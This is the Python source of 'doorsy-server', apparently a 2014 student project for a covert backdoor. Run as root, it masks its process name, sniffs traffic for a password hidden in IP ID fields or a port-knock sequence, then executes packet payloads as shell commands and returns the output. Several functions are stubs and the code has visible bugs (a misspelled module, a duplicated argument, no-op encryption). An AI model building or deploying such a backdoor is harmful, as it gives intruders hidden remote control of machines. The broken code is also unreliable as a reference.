'''
--------------------------------------------------------------------------------------------
-- SCRIPT: doorsy-server.py
-- 
-- FUNCTIONS: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
from config import *
from scapy.all import *
import setproctitle
import os
import thread
import time
import subprocess

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: main()
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
def main():
	# Making sure we're running in root
	if os.geteuid() != 0:
		print "Program must be run as root"
		return

	# Making sure we have at least 1 password or knock.
	# We need either a password or a knock in order for remote access to work
	if len(passwords) < 1 and len(knock) < 1:
		print "Check Config: Program must have at least 1 password or knock sequence"
		return
	else:
		# Masking the process name
		if len(mask) > 1:
			setproctitle.setproctitle(mask)
		try:
			# Setting up the packet filter to limit scanned packets
			# The stricter the filter, the fewer packets to process and therefore the better the performance
			packetFilter = "tcp and ip src not 127.0.0.1"
			if len(sources) > 0:
				first = True
				for source in sources:
					if first:
						packetFilter = packetFilter + "and (ip src " + source
						first = False
					else:
						packetFilter = packetFilter + " or ip src " + source
				packetFilter = packetFilter + ")"

			if len(log) > 0:
				with open(log, "a") as logFile:
					logFile.write("Server starting up at " + time.ctime() + "\n")

			# Beginning Packet sniffing
			sniff(filter=packetFilter, prn=server())
		except KeyboardInterrupt:
			if len(log) > 0:
				with open(log, "a") as logFile:
					logFile.write("Server shutting down at " + time.ctime() + "\n")

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: server
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: server()
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
def server():
	def getResponse(packet):
		# Check for the reset port first
		for port in reset:
			if port == packet[TCP].sport:
				for src, word in passCheck:
					if src == packet[IP].src:
						passCheck.remove([src, word])
						return
				return

		# Append our password and knock arrays with the next value for each and, when apropriate,
		# check if they are valid passphrases/knock sequences.
		if len(passwords) > 0:
			if checkPassword(packet[IP].src, packet[IP].id):
				if len(knock) > 0:
					if checkKnock(packet[IP].src, packet[TCP].dport):
						thread.start_new_thread(clientCommands, (packet))
				else:
					thread.start_new_thread(clientCommands, (packet))
		elif len(knock) > 0:
			if checkKnock(packet[IP].src, packet[TCP].dport):
				thread.start_new_thread(clientCommands, (packet))

	return getResponse

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: checkPassword
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: checkPassword(ip, ipid)
--              ip   - The IP Address from which the packet was received
--              ipid - The ipid of the received packet
-- 
-- RETURNS: True on password match, otherwise False
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
passCheck = []
def checkPassword(ip, ipid):
	found = False
	c = chr(ipid & 0x00FF)
	for i in range(0, len(passCheck)):
		if passCheck[i][0] == ip:
			passCheck[i][1] += c
			
			tooLong = True
			for password in passwords:
				# Only compare to passwords short enough to be contained within the password buffer
				if len(passCheck[i][1]) >= len(password):
					if password in passCheck[i][1]:
						passCheck.pop(i)
						return True
				elif len(knock) == 0:
					tooLong = False

			# If the knock is disabled, clear the buffer once it's longer than the longest password
			if tooLong and len(knock) == 0:
				passCheck.pop(i)
			found = True
			break

	if found == False:
		passCheck.append([ip, str(c)])
	return False

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: checkKnock
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: checkKnock(ip, port)
--              ip   - The IP Address from which the packet was received
--              port - The destination port of the received packet
-- 
-- RETURNS: True on password match, otherwise False
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
knockCheck = []
def checkKnock(ip, port):
	found = False
	for i in range(0, len(knockCheck)):
		if knockCheck[i][0] == ip:
			knockCheck[i][1].append(port)
			
			# Once we've collected enough knocks, check for a valid sequence
			if len(knockCheck[i][1]) == len(knock):
				goodKnock = True
				for j in range(0, len(knock)):
					if knock[j] != knockCheck[i][1][j]:
						goodKnock = False
				if goodKnock:
					knockCheck.pop(i)
					return True
				else:
					# If it's invalid then flush the buffer
					knockCheck.pop(i)
					return False

			found = True
			break
	if found == False:
		knockCheck.append([ip, [port]])
	return False

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: clientCommands
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: clientCommands(packet)
--              packet - The last packet received in the password/knock sequence
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
------------------------------------------------------------------------------
'''
def clientCommands(packet):
	if len(log) > 0:
		with open(log, "a") as logFile:
			logFile.write("Connection Established with " + packet[IP].src + "at " + time.ctime() + "\n")

	seq = random.randint(0, 16777215)
	ipid = random.randint(0, 65535)

	confirmPacket = IP(dst=packet[IP].src, id=ipid)/\
	                TCP(sport=random.randint(0, 65535), dport=packet[TCP].src, seq=seq)
	send(confirmPacket, verbose=0)

	try:
		# Setting up the packet filter to limit scanned packets
		# The stricter the filter, the fewer packets to process and therefore the better the performance
		packetFilter = "tcp and ip src " + packet[IP].src
		if len(ports) > 0:
			first = True
			for source in ports:
				if first:
					packetFilter = packetFilter + "and (src port " + source
					first = False
				else:
					packetFilter = packetFilter + " or src port " + source
			packetFilter = packetFilter + ")"

		# Beginning Packet sniffing
		sniff(filter=packetFilter, prn=server(), timeout=300)
		if len(log) > 0:
			with open(log, "a") as logFile:
				logFile.write("Connection with " + packet[IP].src + " timeout at " + time.ctime() + "\n")

	except SystemExit:
		if len(log) > 0:
			with open(log, "a") as logFile:
				logFile.write("Connection with " + packet[IP].src + " terminated at " + time.ctime() + "\n")

'''
------------------------------------------------------------------------------
-- 
-- FUNCTION: commandParser
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: commandParser()
-- 
-- RETURNS: void
-- 
-- NOTES: 
--
-- --Server Codes--
--       A S F 
--       C Y I 
--       K N N Flag
-- sFile 0 0 0 N/A
-- gFile 1 0 0 A
-- termi 0 1 0 S
-- iNoti 1 1 0 AS
-- Kill  0 0 1 F
------------------------------------------------------------------------------
'''
def commandParser():
	def getResponse(packet):
		# Kill
		if "F" in packet[TCP].flag:
			sys.exit()
		# iNotify
		elif "AS" in packet[TCP].flag:
			notify(packet)
		# Terminal Command
		elif "S" in packet[TCP].flag:
			terminal(packet)
		# Client receives file
		elif "A" in packet[TCP].flag:
			getFile(packet)
		# Client sends file
		else:
			sendFile(packet)

	return getResponse

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendFile(packet)
--              packet - The command packet
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def sendFile(packet):
	print "Do stuff"

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: getFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: getFile(packet)
--              packet - The command packet
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def getFile(packet):
	print "Do stuff"

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: terminal
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: terminal(packet)
--              packet - The command packet
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def terminal(packet):
	output = subpricess.check_output(packet[RAW].load, stderr=subprocess.STDOUT)
	confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
	                TCP(sport=random.randint(0, 65535), sport=packet[TCP].dport, seq=packet[TCP].seq+1)/\
	                RAW(load=encrypt(output))
	send(confirmPacket, verbose=0)
	if len(log) > 0:
		with open(log, "a") as logFile:
			logFile.write("Results of \"" + packet[RAW].load + "\" sent to " + packet[IP].src + " at " + time.ctime() + "\n")

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: notify
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: notify(packet)
--              packet - The command packet
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def notify(packet):
	print "Do stuff"

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: encrypt
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: encrypt(message)
--              message - The message to be encrypted or decryped
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def encrypt(message):
	return message

main()

